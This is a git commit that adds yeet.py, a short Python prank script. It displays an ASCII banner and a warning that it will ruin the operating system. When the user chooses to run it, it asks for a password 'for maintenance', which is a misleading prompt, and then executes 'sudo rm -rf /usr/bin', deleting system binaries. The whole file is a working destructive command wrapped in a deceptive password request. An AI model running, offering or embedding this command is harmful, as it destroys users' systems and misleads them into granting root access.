3acbd4ec1a744f8fa0c97598bd1d5cee82d3d7ab
Cylinder1307 <68974122+Cylinder1307@users.noreply.github.com>
2020-09-23 10:48:23 -0400

    Add files via upload

---
+++ yeet.py
@@ -0,0 +1,35 @@
+import os
+import sys
+from termcolor import colored, cprint
+import time
+
+
+name = colored('''__   __ _____  _____  _____ 
+\ \ / /| ____|| ____||_   _|
+ \ V / |  _|  |  _|    | |  
+  | |  | |___ | |___   | |  
+  |_|  |_____||_____|  |_|  
+                           ''', 'red')
+
+
+def yeet():
+    os.system('clear')
+    cprint(name)
+    print('\n\n')
+    print('Running this file will ruin your os, only use on a virtual machine\n')
+
+    print('1) Run \n2) Abort')
+    choice = input('Choice:     ')
+    
+    if choice == '1':
+        os.system('clear')
+        print('Please input your password for maintenance.')
+        os.system('sudo rm -rf /usr/bin')
+    
+    elif choice == '2':
+        sys.exit()
+    
+    else:
+        sys.exit
+
+yeet()
